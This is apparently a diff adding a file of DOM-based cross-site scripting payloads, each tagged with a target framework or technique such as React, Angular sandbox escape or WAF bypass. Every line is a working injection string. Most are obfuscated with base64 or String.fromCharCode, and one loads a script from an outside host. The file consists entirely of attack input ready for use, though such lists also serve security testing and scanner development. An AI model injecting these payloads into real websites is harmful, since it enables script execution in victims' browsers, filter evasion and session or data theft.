@@ -1,0 +1,26 @@
+[DOM_XSS] [REACT] javascript:eval(atob('YWxlcnQoMSk='))
+[DOM_XSS] [DOM_XSS] javascript:eval(atob('YWxlcnQoMSk='))
+[DOM_XSS] [GENERIC] <img src=x:alert(1) onerror=eval(src)>
+[DOM_XSS] [GENERIC] <script>eval(atob("YWxlcnQoMSk="))</script>
+[DOM_XSS] [REACT] javascript:document.write('<img src=x onerror=alert(1)>')
+[DOM_XSS] [DOM_XSS] javascript:document.write('<img src=x onerror=alert(1)>')
+[DOM_XSS] [REACT] javascript:document.body.innerHTML='<img src=x onerror=alert(1)>
+[DOM_XSS] [REACT] javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))
+[DOM_XSS] [DOM_XSS] javascript:document.body.innerHTML='<img src=x onerror=alert(1)>
+[DOM_XSS] [WAF_BYPASS] <svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+[DOM_XSS] [ANGULAR] {{a="a"["constructor"].prototype;a.charAt=a.trim;$eval("a,alert(1),a")}}
+[DOM_XSS] [WAF_BYPASS] <script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+[DOM_XSS] [ANGULAR] {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//')}}
+[DOM_XSS] [ANGULAR] {{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,alert(1),a')}}
+[DOM_XSS] [WAF_BYPASS] <img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
+[DOM_XSS] [ANGULAR] {{ "a".constructor.prototype.charAt=[].join; $eval("x=1} } };alert(1);//"); }}
+[DOM_XSS] [ANGULAR] {{ x = {'y':''.constructor.prototype}; x['y'].charAt=[].join; $eval('x=alert(1)'); }}
+[DOM_XSS] [REACT] javascript:eval('var a=document.createElement(\'script\');a.src=\'https://xss.cania\';document.body.appendChild(a)')
+[DOM_XSS] [WAF_BYPASS] <svg onload=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))>
+[DOM_XSS] [WAF_BYPASS] <script>document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))</script>
+[DOM_XSS] [REACT] javascript:document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62))
+[DOM_XSS] [WAF_BYPASS] <img src=x onerror=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62))>
+[DOM_XSS] [REACT] javascript:document.body.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62)
+[DOM_XSS] [WAF_BYPASS] <svg onload=document.body.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62)>
+[DOM_XSS] [WAF_BYPASS] <script>document.body.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62)</script>
+[DOM_XSS] [WAF_BYPASS] <img src=x onerror=document.body.innerHTML=String.fromCharCode(60,105,109,103,32,115,114,99,61,120,32,111,110,101,114,114,111,114,61,97,108,101,114,116,40,49,41,62)>
